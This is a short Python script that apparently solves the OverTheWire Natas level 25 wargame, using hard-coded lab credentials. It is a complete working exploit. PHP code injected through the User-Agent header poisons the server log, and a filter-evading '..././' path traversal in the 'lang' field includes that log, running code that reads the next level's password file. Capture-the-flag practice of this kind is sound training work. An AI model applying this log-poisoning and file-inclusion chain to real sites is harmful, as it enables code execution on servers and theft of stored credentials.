import requests

target = 'http://natas25.natas.labs.overthewire.org/?revelio=1'
auth = ('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')

session=requests.Session()
malhead={"User-Agent":'<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'}

response = session.get(target, auth=auth)
response=session.post(url=target,headers=malhead,auth=auth,data={"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" +  session.cookies['PHPSESSID'] + ".log"})
print(response.text)